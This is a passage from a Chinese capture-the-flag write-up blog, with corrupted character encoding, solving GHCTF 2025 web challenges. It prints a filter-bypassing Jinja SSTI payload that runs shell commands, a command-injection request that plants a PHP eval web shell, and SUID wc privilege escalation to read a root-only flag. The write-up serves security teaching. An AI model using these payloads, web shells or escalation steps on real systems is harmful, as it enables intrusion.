            return jsonify(&#123;&quot;error&quot;: &quot;æ–‡ä»¶ç±»å‹é”™è¯¯&quot;&#125;), 400

    # GET è¯·æ±‚æ˜¾ç¤ºä¸Šä¼ è¡¨å•ï¼ˆå¯é€‰ï¼‰
    return &#39;&#39;&#39;
    &lt;!doctype html&gt;
    &lt;title&gt;Upload File&lt;/title&gt;
    &lt;h1&gt;Upload File&lt;/h1&gt;
    &lt;form method=post enctype=multipart/form-data&gt;
      &lt;input type=file name=file&gt;
      &lt;input type=submit value=Upload&gt;
    &lt;/form&gt;
    &#39;&#39;&#39;

@app.route(&#39;/file/&lt;path:filename&gt;&#39;)
def view_file(filename):
    try:
        # 1. è¿‡æ»¤æ–‡ä»¶å
        safe_filename = secure_filename(filename)
        if not safe_filename:
            abort(400, description=&quot;æ— æ•ˆæ–‡ä»¶å&quot;)

        # 2. æ„é€ å®Œæ•´è·¯å¾„
        file_path = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], safe_filename)

        # 3. è·¯å¾„å®‰å…¨æ£€æŸ¥
        if not is_safe_path(app.config[&#39;UPLOAD_FOLDER&#39;], file_path):
            abort(403, description=&quot;ç¦æ­¢è®¿é—®çš„è·¯å¾„&quot;)

        # 4. æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨
        if not os.path.isfile(file_path):
            abort(404, description=&quot;æ–‡ä»¶ä¸å­˜åœ¨&quot;)

        suffix=os.path.splitext(filename)[1]
        print(suffix)
        if suffix==&quot;.jpg&quot; or suffix==&quot;.png&quot; or suffix==&quot;.gif&quot;:
            return send_from_directory(&quot;static/uploads/&quot;,filename,mimetype=&#39;image/jpeg&#39;)

        if contains_dangerous_keywords(file_path):
            # åˆ é™¤ä¸å®‰å…¨çš„æ–‡ä»¶
            os.remove(file_path)
            return jsonify(&#123;&quot;error&quot;: &quot;Waf!!!!&quot;&#125;), 400

        with open(file_path, &#39;rb&#39;) as f:
            file_data = f.read().decode(&#39;utf-8&#39;)
        tmp_str = &quot;&quot;&quot;&lt;!DOCTYPE html&gt;
        &lt;html lang=&quot;zh&quot;&gt;
        &lt;head&gt;
            &lt;meta charset=&quot;UTF-8&quot;&gt;
            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
            &lt;title&gt;æŸ¥çœ‹æ–‡ä»¶å†…å®¹&lt;/title&gt;
        &lt;/head&gt;
        &lt;body&gt;
            &lt;h1&gt;æ–‡ä»¶å†…å®¹ï¼š&#123;name&#125;&lt;/h1&gt;  &lt;!-- æ˜¾ç¤ºæ–‡ä»¶å --&gt;
            &lt;pre&gt;&#123;data&#125;&lt;/pre&gt;  &lt;!-- æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ --&gt;

            &lt;footer&gt;
                &lt;p&gt;&amp;copy; 2025 æ–‡ä»¶æŸ¥çœ‹å™¨&lt;/p&gt;
            &lt;/footer&gt;
        &lt;/body&gt;
        &lt;/html&gt;
        &quot;&quot;&quot;.format(name=safe_filename, data=file_data)

        return render_template_string(tmp_str)

    except Exception as e:
        app.logger.error(f&quot;æ–‡ä»¶æŸ¥çœ‹å¤±è´¥: &#123;str(e)&#125;&quot;)
        abort(500, description=&quot;æ–‡ä»¶æŸ¥çœ‹å¤±è´¥:&#123;&#125; &quot;.format(str(e)))

# é”™è¯¯å¤„ç†ï¼ˆå¯é€‰ï¼‰
@app.errorhandler(404)
def not_found(error):
    return &#123;&quot;error&quot;: error.description&#125;, 404

@app.errorhandler(403)
def forbidden(error):
    return &#123;&quot;error&quot;: error.description&#125;, 403

if __name__ == &#39;__main__&#39;:
    app.run(&quot;0.0.0.0&quot;,debug=False)
</code></pre>
<p><font style="color:rgb(82, 95, 127);">ä¸‹è½½é™„ä»¶ï¼Œå‘ç°æ˜¯æºç ï¼Œå¼€å§‹ä»£ç å®¡è®¡</font></p>
<p><font style="color:rgb(82, 95, 127);">å®¡å®Œå‘ç°ï¼Œé‡ç‚¹åœ¨äºè¿™ä¸€å—</font></p>
<pre><code class="language-python">@app.route(&#39;/file/&lt;path:filename&gt;&#39;)
def view_file(filename):
    try:
        # 1. è¿‡æ»¤æ–‡ä»¶å
        safe_filename = secure_filename(filename)
        if not safe_filename:
            abort(400, description=&quot;æ— æ•ˆæ–‡ä»¶å&quot;)

        # 2. æ„é€ å®Œæ•´è·¯å¾„
        file_path = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], safe_filename)

        # 3. è·¯å¾„å®‰å…¨æ£€æŸ¥
        if not is_safe_path(app.config[&#39;UPLOAD_FOLDER&#39;], file_path):
            abort(403, description=&quot;ç¦æ­¢è®¿é—®çš„è·¯å¾„&quot;)

        # 4. æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨
        if not os.path.isfile(file_path):
            abort(404, description=&quot;æ–‡ä»¶ä¸å­˜åœ¨&quot;)

        suffix=os.path.splitext(filename)[1]
        print(suffix)
        if suffix==&quot;.jpg&quot; or suffix==&quot;.png&quot; or suffix==&quot;.gif&quot;:
            return send_from_directory(&quot;static/uploads/&quot;,filename,mimetype=&#39;image/jpeg&#39;)

        if contains_dangerous_keywords(file_path):
            # åˆ é™¤ä¸å®‰å…¨çš„æ–‡ä»¶
            os.remove(file_path)
            return jsonify(&#123;&quot;error&quot;: &quot;Waf!!!!&quot;&#125;), 400
</code></pre>
<p><font style="color:rgb(82, 95, 127);">åœ¨ &#x2F;file ä¸‹æ‰èƒ½è§¦å‘ä¸Šä¼ æ–‡ä»¶ï¼Œè¿˜å‘ç°æœ‰å…³é”®è¯è¿‡æ»¤</font></p>
<pre><code class="language-python">def contains_dangerous_keywords(file_path):
    dangerous_keywords = [&#39;_&#39;, &#39;os&#39;, &#39;subclasses&#39;, &#39;__builtins__&#39;, &#39;__globals__&#39;,&#39;flag&#39;,]
</code></pre>
<p>ç®€å•çš„å…³é”®è¯è¿‡æ»¤ï¼Œå­—ç¬¦ä¸²æ‹¼æ¥å°±èƒ½è¿‡<br>å…ˆå°è¯•è§¦å‘ä¸€ä¸‹ ssti<br>payload:49<br>è®¿é—® &#x2F;file&#x2F;<filename>ï¼ŒæˆåŠŸè§¦å‘ 7*7ï¼Œè¯´æ˜æ³¨å…¥ç‚¹ç¡®å®åœ¨è¿™å„¿</filename></p>
<p><img src="image-20250316161453834.png" loading="lazy"></p>
<p>æµ‹è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·å–ç±»</p>
<pre><code class="language-python">payload: &#123;&#123;â€™â€™|attr(â€classâ€)&#125;&#125;
</code></pre>
<p>åº”ä¸ºä¸‹åˆ’çº¿è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ç”¨ | attr ä»£æ›¿<br>â€œâ€.<strong>class</strong> &#x3D;&#x3D; â€œâ€|attr(â€œclassâ€)<br>å†æ¬¡è®¿é—®</p>
<p><img src="image-20250316161808503.png" loading="lazy"></p>
<p>å¹¶æ²¡æœ‰å›æ˜¾ï¼Œç»§ç»­å°è¯• lipsum</p>
<pre><code class="language-python">payload : &#123;&#123;lipsum&#125;&#125;
</code></pre>
<p><img src="image-20250316162139913.png" loading="lazy"></p>
<p>æ€è·¯æ˜ç¡®äº†ï¼Œç›´æ¥å°è¯•æ„é€ <br>payload :</p>
<pre><code class="language-python"> &#123;&#123;lipsum|attr(â€globalsâ€).get(â€osâ€).popen(â€lsâ€).read()&#125;&#125;
</code></pre>
<p>ä½†æ˜¯åœ¨è¿‡æ»¤ä¸­ä¸ä½†è¿‡æ»¤äº†å…³é”®è¯ globals å’Œ os è¿˜è¿‡æ»¤äº†ä¸‹åˆ’çº¿ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•ä½¿ç”¨ unicode ç¼–ç ç»•è¿‡<br>æ‰€ä»¥æœ€ç»ˆ payload ä¸º</p>
<pre><code class="language-python">&#123;&#123;((((lipsum|attr(â€œ\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005fâ€))|attr(â€œ\u0067\u0065\u0074â€)(â€œoâ€â€sâ€))|attr(â€œ\u0070\u006f\u0070\u0065\u006eâ€)(â€œlsâ€))|attr(â€œ\u0072\u0065\u0061\u0064â€)())&#125;&#125;
</code></pre>
<p><img src="image-20250316162209165.png" loading="lazy"></p>
<p>é™¤äº† unicode ç¼–ç å¤–ï¼Œå…³é”®å­—è¿‡æ»¤è¿˜èƒ½ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡</p>
<pre><code class="language-python">ä¹Ÿå¯ä»¥ä¸ä½¿ç”¨+å·
os == &#39;o&#39;&#39;s&#39;
ä¹Ÿå¯ä»¥ä¸ä½¿ç”¨+å·
os == &#39;o&#39;&#39;s&#39;
</code></pre>
<h1 id="GHCTF-2025-GetShell"><a href="#GHCTF-2025-GetShell" class="headerlink" title="[GHCTF 2025]GetShell"></a>[GHCTF 2025]GetShell</h1><h2 id="é¢˜ç›®é“¾æ¥-5"><a href="#é¢˜ç›®é“¾æ¥-5" class="headerlink" title="é¢˜ç›®é“¾æ¥"></a>é¢˜ç›®é“¾æ¥</h2><p><a target="_blank" rel="noopener" href="http://node1.anna.nssctf.cn:28578/">http://node1.anna.nssctf.cn:28578/</a></p>
<h2 id="é¢˜è§£ï¼ˆwpï¼‰-3"><a href="#é¢˜è§£ï¼ˆwpï¼‰-3" class="headerlink" title="é¢˜è§£ï¼ˆwpï¼‰"></a>é¢˜è§£ï¼ˆwpï¼‰</h2><p>å¼€å¯é¶åœºï¼Œå‘ç°ç»™äº†æºç </p>
<pre><code class="language-php">&lt;?php
highlight_file(__FILE__);

class ConfigLoader &#123;
    private $config;

    public function __construct() &#123;
        $this-&gt;config = [
            &#39;debug&#39; =&gt; true,
            &#39;mode&#39; =&gt; &#39;production&#39;,
            &#39;log_level&#39; =&gt; &#39;info&#39;,
            &#39;max_input_length&#39; =&gt; 100,
            &#39;min_password_length&#39; =&gt; 8,
            &#39;allowed_actions&#39; =&gt; [&#39;run&#39;, &#39;debug&#39;, &#39;generate&#39;]
        ];
    &#125;

    public function get($key) &#123;
        return $this-&gt;config[$key] ?? null;
    &#125;
&#125;

class Logger &#123;
    private $logLevel;

    public function __construct($logLevel) &#123;
        $this-&gt;logLevel = $logLevel;
    &#125;

    public function log($message, $level = &#39;info&#39;) &#123;
        if ($level === $this-&gt;logLevel) &#123;
            echo &quot;[LOG] $message\n&quot;;
        &#125;
    &#125;
&#125;

class UserManager &#123;
    private $users = [];
    private $logger;

    public function __construct($logger) &#123;
        $this-&gt;logger = $logger;
    &#125;

    public function addUser($username, $password) &#123;
        if (strlen($username) &lt; 5) &#123;
            return &quot;Username must be at least 5 characters&quot;;
        &#125;

        if (strlen($password) &lt; 8) &#123;
            return &quot;Password must be at least 8 characters&quot;;
        &#125;

        $this-&gt;users[$username] = password_hash($password, PASSWORD_BCRYPT);
        $this-&gt;logger-&gt;log(&quot;User $username added&quot;);
        return &quot;User $username added&quot;;
    &#125;

    public function authenticate($username, $password) &#123;
        if (isset($this-&gt;users[$username]) &amp;&amp; password_verify($password, $this-&gt;users[$username])) &#123;
            $this-&gt;logger-&gt;log(&quot;User $username authenticated&quot;);
            return &quot;User $username authenticated&quot;;
        &#125;
        return &quot;Authentication failed&quot;;
    &#125;
&#125;

class StringUtils &#123;
    public static function sanitize($input) &#123;
        return htmlspecialchars($input, ENT_QUOTES, &#39;UTF-8&#39;);
    &#125;

    public static function generateRandomString($length = 10) &#123;
        return substr(str_shuffle(str_repeat($x = &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;, ceil($length / strlen($x)))), 1, $length);
    &#125;
&#125;

class InputValidator &#123;
    private $maxLength;

    public function __construct($maxLength) &#123;
        $this-&gt;maxLength = $maxLength;
    &#125;

    public function validate($input) &#123;
        if (strlen($input) &gt; $this-&gt;maxLength) &#123;
            return &quot;Input exceeds maximum length of &#123;$this-&gt;maxLength&#125; characters&quot;;
        &#125;
        return true;
    &#125;
&#125;

class CommandExecutor &#123;
    private $logger;

    public function __construct($logger) &#123;
        $this-&gt;logger = $logger;
    &#125;

    public function execute($input) &#123;
        if (strpos($input, &#39; &#39;) !== false) &#123;
            $this-&gt;logger-&gt;log(&quot;Invalid input: space detected&quot;);
            die(&#39;No spaces allowed&#39;);
        &#125;

        @exec($input, $output);
        $this-&gt;logger-&gt;log(&quot;Result: $input&quot;);
        return implode(&quot;\n&quot;, $output);
    &#125;
&#125;

class ActionHandler &#123;
    private $config;
    private $logger;
    private $executor;

    public function __construct($config, $logger) &#123;
        $this-&gt;config = $config;
        $this-&gt;logger = $logger;
        $this-&gt;executor = new CommandExecutor($logger);
    &#125;

    public function handle($action, $input) &#123;
        if (!in_array($action, $this-&gt;config-&gt;get(&#39;allowed_actions&#39;))) &#123;
            return &quot;Invalid action&quot;;
        &#125;

        if ($action === &#39;run&#39;) &#123;
            $validator = new InputValidator($this-&gt;config-&gt;get(&#39;max_input_length&#39;));
            $validationResult = $validator-&gt;validate($input);
            if ($validationResult !== true) &#123;
                return $validationResult;
            &#125;

            return $this-&gt;executor-&gt;execute($input);
        &#125; elseif ($action === &#39;debug&#39;) &#123;
            return &quot;Debug mode enabled&quot;;
        &#125; elseif ($action === &#39;generate&#39;) &#123;
            return &quot;Random string: &quot; . StringUtils::generateRandomString(15);
        &#125;

        return &quot;Unknown action&quot;;
    &#125;
&#125;

if (isset($_REQUEST[&#39;action&#39;])) &#123;
    $config = new ConfigLoader();
    $logger = new Logger($config-&gt;get(&#39;log_level&#39;));

    $actionHandler = new ActionHandler($config, $logger);
    $input = $_REQUEST[&#39;input&#39;] ?? &#39;&#39;;
    echo $actionHandler-&gt;handle($_REQUEST[&#39;action&#39;], $input);
&#125; else &#123;
    $config = new ConfigLoader();
    $logger = new Logger($config-&gt;get(&#39;log_level&#39;));
    $userManager = new UserManager($logger);

    if (isset($_POST[&#39;register&#39;])) &#123;
        $username = $_POST[&#39;username&#39;];
        $password = $_POST[&#39;password&#39;];

        echo $userManager-&gt;addUser($username, $password);
    &#125;

    if (isset($_POST[&#39;login&#39;])) &#123;
        $username = $_POST[&#39;username&#39;];
        $password = $_POST[&#39;password&#39;];

        echo $userManager-&gt;authenticate($username, $password);
    &#125;

    $logger-&gt;log(&quot;No action provided, running default logic&quot;);
&#125; [LOG] No action provided, running default logic
</code></pre>
<p><font style="color:rgb(38,38,38);">å‘½ä»¤æ‰§â¾ç‚¹ï¼šæ­¤æ—¶çš„ç±»åå·²ç»æç¤ºå¾—å¾ˆæ˜æ˜¾äº†ï¼šCommandExecutor</font></p>
<pre><code class="language-php">class CommandExecutor &#123;
    private $logger;

    public function __construct($logger) &#123;
        $this-&gt;logger = $logger;
    &#125;

    public function execute($input) &#123;
        if (strpos($input, &#39; &#39;) !== false) &#123;
            $this-&gt;logger-&gt;log(&quot;Invalid input: space detected&quot;);
            die(&#39;No spaces allowed&#39;);
        &#125;

        @exec($input, $output);
        $this-&gt;logger-&gt;log(&quot;Result: $input&quot;);
        return implode(&quot;\n&quot;, $output);
    &#125;
&#125;
</code></pre>
<p><font style="color:rgb(38,38,38);">æ¥ä¸‹æ¥ç»§ç»­å®¡è®¡ä¼šå‘ç°æœ‰â¼€ä¸ªå‰ç½®æ¡ä»¶</font></p>
<pre><code class="language-php">if ($action === &#39;run&#39;) &#123;
            $validator = new InputValidator($this-&gt;config-&gt;get(&#39;max_input_length&#39;));
            $validationResult = $validator-&gt;validate($input);
            if ($validationResult !== true) &#123;
                return $validationResult;
            &#125;

            return $this-&gt;executor-&gt;execute($input);
</code></pre>
<p><font style="color:rgb(38,38,38);">åªæœ‰å½“action&#x3D;runçš„æƒ…å†µä¸‹æ‰ä¼šæ‰§â¾ã€‚é‚£è¿™å°±å¾ˆå¥½æ„é€ äº†ï¼š</font></p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a><font style="color:rgb(38,38,38);">getshell</font></h3><pre><code class="language-php">?action=run&amp;input=echo%09PD9waHAgZXZhbCgkX1BPU1RbMF0pOz8%2b|base64%09-d%3Es
hell.php
</code></pre>
<p><img src="1742110248326-9029419c-b8df-4dcf-b73c-d4e59cc6897b.png" loading="lazy"></p>
<p><img src="1742110292105-889ffac7-3f93-451c-8da9-aedc7d20faa9.png" loading="lazy"></p>
<p>ç›´æ¥èšå‰‘è¿æ¥</p>
<p><img src="1742110415741-d0664a5d-c56f-4588-a008-656b40c253f0.png" loading="lazy"></p>
<p><img src="1742110458398-dde4091b-f7a1-4922-8ada-d188362e9f59.png" loading="lazy"></p>
<p>å°è¯•è¯»å–flag</p>
<p><img src="1742110533854-eb00a2e2-7b37-4e26-b311-3c8f6c535939.png" loading="lazy"></p>
<p>æ‰“å¼€å‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼ï¼ï¼ï¼</p>
<p>ğŸ˜±ğŸ˜±ğŸ˜±</p>
<p>æ˜æ˜æœ‰å¤§å°æ‰“å¼€å´å‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰</p>
<p>ã€Šflagå¤±è¸ªæ¡ˆã€‹</p>
<p>çœŸç›¸åªæœ‰ä¸€ä¸ªğŸ•µï¸</p>
<p>å›åˆ°æ ¹ç›®å½•ï¼Œæœ‰ä¸€ä¸ªdockerçš„é…ç½®æ–‡ä»¶</p>
<p><img src="1742110684450-de6eb184-da12-4bd8-823b-30e4b3192f47.png" loading="lazy"></p>
<pre><code class="language-shell">#!/bin/sh

# Get the user
user=$(ls /home)

# Check the environment variables for the flag and assign to INSERT_FLAG
# éœ€è¦æ³¨æ„ï¼Œä»¥ä¸‹è¯­å¥ä¼šå°†FLAGç›¸å…³ä¼ é€’å˜é‡è¿›è¡Œè¦†ç›–ï¼Œå¦‚æœéœ€è¦ï¼Œè¯·æ³¨æ„ä¿®æ”¹ç›¸å…³æ“ä½œ
if [ &quot;$DASFLAG&quot; ]; then
    INSERT_FLAG=&quot;$DASFLAG&quot;
    export DASFLAG=no_FLAG
    DASFLAG=no_FLAG
elif [ &quot;$FLAG&quot; ]; then
    INSERT_FLAG=&quot;$FLAG&quot;
    export FLAG=no_FLAG
    FLAG=no_FLAG
elif [ &quot;$GZCTF_FLAG&quot; ]; then
    INSERT_FLAG=&quot;$GZCTF_FLAG&quot;
    export GZCTF_FLAG=no_FLAG
    GZCTF_FLAG=no_FLAG
else
    INSERT_FLAG=&quot;flag&#123;TEST_Dynamic_FLAG&#125;&quot;
fi

# å°†FLAGå†™å…¥æ–‡ä»¶ è¯·æ ¹æ®éœ€è¦ä¿®æ”¹
echo $INSERT_FLAG | tee /flag

chmod 700 /flag

exec apache2-foreground
</code></pre>
<p>æ³¨æ„è¿™ä¸€è¡Œ</p>
<p>chmod 700 &#x2F;flag</p>
<p>å®ƒçš„ä½œç”¨æ˜¯ç¡®ä¿åªæœ‰æ–‡ä»¶æ‰€æœ‰è€…ï¼ˆå¦‚rootï¼‰å¯è¯»å†™ï¼Œé˜»æ­¢å…¶ä»–ç”¨æˆ·æˆ–æœåŠ¡ï¼ˆå¦‚Apacheçš„<code>www-data</code>ç”¨æˆ·ï¼‰ç›´æ¥è®¿é—®ã€‚</p>
<p>é‚£å°±å¾ˆæ˜äº†äº†ï¼Œç›´æ¥ææƒä¾¿æ˜¯</p>
<h3 id="Suidææƒ"><a href="#Suidææƒ" class="headerlink" title="Suidææƒ"></a><font style="color:rgb(38,38,38);">Suidææƒ</font></h3><p><font style="color:rgb(38,38,38);">æ‰€è°“suidå°±æ˜¯ï¼Œä½ æœ¬æ¥æ˜¯www-dataçš„æƒé™ï¼Œä½†æ˜¯å½“ä½ æ‰§â¾æœ‰ </font></p>
<p><font style="color:rgb(38,38,38);">suidæƒé™çš„â½‚ä»¶æ—¶ï¼Œä½ ä¼šæš‚æ—¶æ‹¥æœ‰è¿™â½‚ä»¶æ‰€æœ‰è€…çš„æƒé™ï¼ˆâ½å¦‚rootï¼‰ã€‚</font></p>
<p><font style="color:rgb(38,38,38);">å…³äºSuidææƒçš„æ–‡ç« </font></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11981">https://xz.aliyun.com/news/11981</a></p>
<p><img src="1742111741730-fafc41ac-9272-443a-9203-9f2f17a202e4.png" loading="lazy"></p>
<pre><code class="language-shell">find / -user root -perm -4000 -print 2&gt;/dev/null
result:
(www-data:/var/www/html) $ find / -user root -perm -4000 -print 2&gt;/dev/nul
l
/var/www/html/wc
/bin/umount
/bin/mount
/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
</code></pre>
<p><font style="color:rgb(38,38,38);">æœ‰ä¸€ä¸ªwcæ–‡ä»¶æœ‰ç‚¹å¯ç–‘</font></p>
<p><font style="color:rgb(38,38,38);">å»æ‰¾æ‰¾è¿™ä¸ªæ–‡ä»¶æ˜¯å¦èƒ½ææƒ</font></p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
<p><img src="1742111901549-6bbd1783-e9c8-42e1-8f45-ccddc2985221.png" loading="lazy"></p>
<p>å¯ä»¥è¿›è¡Œææƒï¼ŒæŒ‰ç…§æ–‡æ¡£æ¥åš</p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/wc/#suid">https://gtfobins.github.io/gtfobins/wc/#suid</a></p>
<p><img src="1742111988479-affd37b8-8c6e-4f71-839f-88123bdc9cb0.png" loading="lazy"></p>
<pre><code class="language-shell">/var/www/html/wc --files0-from &quot;$LFILE&quot;
</code></pre>
<p><img src="1742112064301-cd58df66-eda2-4bd0-97c5-18c715ab6aca.png" loading="lazy"></p>
<p>è§£å‡ºflag</p>
<h1 id="GHCTF-2025-Escapeï¼"><a href="#GHCTF-2025-Escapeï¼" class="headerlink" title="[GHCTF 2025]Escapeï¼"></a>[GHCTF 2025]Escapeï¼</h1><h2 id="é¢˜ç›®é“¾æ¥-6"><a href="#é¢˜ç›®é“¾æ¥-6" class="headerlink" title="é¢˜ç›®é“¾æ¥"></a>é¢˜ç›®é“¾æ¥</h2><p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6537">https://www.nssctf.cn/problem/6537</a></p>
<h2 id="é¢˜è§£ï¼ˆwpï¼‰-4"><a href="#é¢˜è§£ï¼ˆwpï¼‰-4" class="headerlink" title="é¢˜è§£ï¼ˆwpï¼‰"></a>é¢˜è§£ï¼ˆwpï¼‰</h2><p><img src="1742522958050-224f8bd1-5f7b-475b-a022-3ed96e72432a.png" loading="lazy"></p>
<p>é¢˜ç›®ç»™äº†æºç </p>
<p><img src="1742523019194-a1946d0b-5721-4313-b9ec-ca309bcaa15d.png" loading="lazy"></p>
<p>æºç ğŸ¤¢ğŸ¤¢ğŸ¤¢ğŸ¤¢ï¼ï¼ï¼ï¼</p>
<p>dashboard.php</p>
<pre><code class="language-php">&lt;?php
ini_set(&#39;display_errors&#39;, 0);
error_reporting(0);
include &quot;class.php&quot;;
function checkSignedCookie($cookieName = &#39;user_token&#39;, $secretKey = &#39;fake_secretkey&#39;) &#123;
    // è·å– Cookie å†…å®¹
    if (isset($_COOKIE[$cookieName])) &#123;
        $token = $_COOKIE[$cookieName];

        // è§£ç å¹¶åˆ†å‰²æ•°æ®å’Œç­¾å
        $decodedToken = base64_decode($token);
        list($serializedData, $providedSignature) = explode(&#39;|&#39;, $decodedToken);

        // é‡æ–°è®¡ç®—ç­¾å
        $calculatedSignature = hash_hmac(&#39;sha256&#39;, $serializedData, $secretKey);

        // æ¯”è¾ƒç­¾åæ˜¯å¦ä¸€è‡´
        if ($calculatedSignature === $providedSignature) &#123;
            // ç­¾åéªŒè¯é€šè¿‡ï¼Œè¿”å›åºåˆ—åŒ–çš„æ•°æ®
            return $serializedData;  // ååºåˆ—åŒ–æ•°æ®
        &#125; else &#123;
            // ç­¾åéªŒè¯å¤±è´¥
            return false;
        &#125;
    &#125;
    return false;  // å¦‚æœæ²¡æœ‰ Cookie
&#125;

// ç¤ºä¾‹ï¼šéªŒè¯å¹¶è¯»å– Cookie
$userData = checkSignedCookie();
if ($userData) &#123;
    #echo $userData;
    $user=unserialize($userData);
    #var_dump($user);
    if($user-&gt;isadmin)&#123;
        $tmp=file_get_contents(&quot;tmp/admin.html&quot;);

        echo $tmp;

        if($_POST[&#39;txt&#39;]) &#123;
        	$content = &#39;&lt;?php exit; ?&gt;&#39;;
		$content .= $_POST[&#39;txt&#39;];
		file_put_contents($_POST[&#39;filename&#39;], $content);
        &#125;
    &#125;
    else&#123;
        $tmp=file_get_contents(&quot;tmp/admin.html&quot;);
        echo $tmp;
    	if($_POST[&#39;txt&#39;]||$_POST[&#39;filename&#39;])&#123;
        echo &quot;&lt;h1&gt;æƒé™ä¸è¶³ï¼Œå†™å…¥å¤±è´¥&lt;h1&gt;&quot;;
&#125;
    &#125;
&#125; else &#123;
    echo &#39;tokenéªŒè¯å¤±è´¥&#39;;
&#125;
</code></pre>
<p>æ¥çœ‹è¿™ä¸€è¡Œ</p>
<pre><code class="language-php">$userData = checkSignedCookie();
if ($userData) &#123;
    #echo $userData;
    $user=unserialize($userData);
    #var_dump($user);
    if($user-&gt;isadmin)&#123;
        $tmp=file_get_contents(&quot;tmp/admin.html&quot;);

        echo $tmp;

        if($_POST[&#39;txt&#39;]) &#123;
        	$content = &#39;&lt;?php exit; ?&gt;&#39;;
		$content .= $_POST[&#39;txt&#39;];
		file_put_contents($_POST[&#39;filename&#39;], $content);
        &#125;
    &#125;
    else&#123;
        $tmp=file_get_contents(&quot;tmp/admin.html&quot;);
        echo $tmp;
    	if($_POST[&#39;txt&#39;]||$_POST[&#39;filename&#39;])&#123;
        echo &quot;&lt;h1&gt;æƒé™ä¸è¶³ï¼Œå†™å…¥å¤±è´¥&lt;h1&gt;&quot;;
&#125;
</code></pre>
<p>è¿™é‡Œå¾ˆæ˜æ˜¾æœ‰ä¸€ä¸ªæ–‡ä»¶å†™å…¥çš„æ“ä½œï¼Œåªè¦ç»•è¿‡<?php exit; ?>å³å¯æ‰§è¡Œå‘½ä»¤</p>
<p>ä½†æ˜¯è¿™ä¸ªæ–‡ä»¶å†™å…¥åˆå¿…é¡»æ˜¯adminï¼Œä¸ç„¶å°±ä¼šæç¤ºæ²¡æœ‰æƒé™</p>
<p>å¯ä»¥çŸ¥é“<br>é¦–å…ˆæ˜¯è·å¾—sessionç„¶åè§£å¯†ï¼Œå°†è§£å¯†å†…å®¹è¿›è¡Œååºåˆ—è¯ï¼Œç„¶åè°ƒç”¨ååºåˆ—åŒ–å®ä¾‹çš„isadminæ–¹æ³•ã€‚é¦–å…ˆæˆ‘ä»¬ä¸çŸ¥é“å¯†é’¥å€¼æ˜¯å¤šå°‘æ‰€ä»¥æ— æ³•ç›´æ¥é€šè¿‡ä¼ªé€ sseionæ¥ä¼ªé€ adminã€‚</p>
<p>æŸ¥çœ‹login.php</p>
<pre><code class="language-python">&lt;?php
ini_set(&#39;display_errors&#39;, 0);
error_reporting(0);
include &quot;waf.php&quot;;
include &quot;class.php&quot;;
include &quot;db.php&quot;;
$username=$_POST[&quot;username&quot;];
$password=$_POST[&quot;password&quot;];

$SQL=new Database();
function login($db,$username,$password)
&#123;
    $data=$db-&gt;query(&quot;SELECT * FROM users WHERE username = ?&quot;,[$username]);

    if(empty($data))&#123;
        die(&quot;&lt;script&gt;alert(&#39;ç”¨æˆ·ä¸å­˜åœ¨&#39;)&lt;/script&gt;&lt;script&gt;window.location.href = &#39;index.html&#39;&lt;/script&gt;&quot;);
    &#125;
    if($data[0][&#39;password&#39;]!==md5($password))&#123;
        die(&quot;&lt;script&gt;alert(&#39;å¯†ç é”™è¯¯&#39;)&lt;/script&gt;&lt;script&gt;window.location.href = &#39;index.html&#39;&lt;/script&gt;&quot;);
    &#125;
    if($data[0][&#39;username&#39;]===&#39;admin&#39;) &#123;
        $user = new User($username, true);
    &#125;
    else&#123;
        $user = new User($username, false);
    &#125;
    return $user;
&#125;

function setSignedCookie($serializedData, $cookieName = &#39;user_token&#39;, $secretKey = &#39;fake_secretKey&#39;) &#123;
    $signature = hash_hmac(&#39;sha256&#39;, $serializedData, $secretKey);

    $token = base64_encode($serializedData . &#39;|&#39; . $signature);

    setcookie($cookieName, $token, time() + 3600, &quot;/&quot;);  // è®¾ç½®æœ‰æ•ˆæœŸä¸º1å°æ—¶
&#125;

$User=login($SQL,$username,$password);

$User_ser=waf(serialize($User));

setSignedCookie($User_ser);

header(&quot;Location: dashboard.php&quot;);

?&gt;
</code></pre>
<p>å¯ä»¥å‘ç°åœ¨loginæ–¹æ³•ä¸­æœ€åè¿”å›çš„æ˜¯ä¸€ä¸ªuserç±»ï¼Œ</p>
<pre><code class="language-python">return $user;
</code></pre>
<p>éšåå†å°†è¿™ä¸ªç±»è¿›è¡Œåºåˆ—åŒ–å¹¶ä¼ å…¥wafæ–¹æ³•æ£€æµ‹</p>
<p>ç„¶åä½¿ç”¨setSignedCookie()æ–¹æ³•è¿›è¡ŒåŠ å¯†</p>
<pre><code class="language-python">function setSignedCookie($serializedData, $cookieName = &#39;user_token&#39;, $secretKey = &#39;fake_secretKey&#39;) &#123;
    $signature = hash_hmac(&#39;sha256&#39;, $serializedData, $secretKey);

    $token = base64_encode($serializedData . &#39;|&#39; . $signature);

    setcookie($cookieName, $token, time() + 3600, &quot;/&quot;);  // è®¾ç½®æœ‰æ•ˆæœŸä¸º1å°æ—¶
&#125;
</code></pre>
<p>å†å»çœ‹çœ‹waf.php</p>
<pre><code class="language-python">&lt;?php

function waf($c)
&#123;
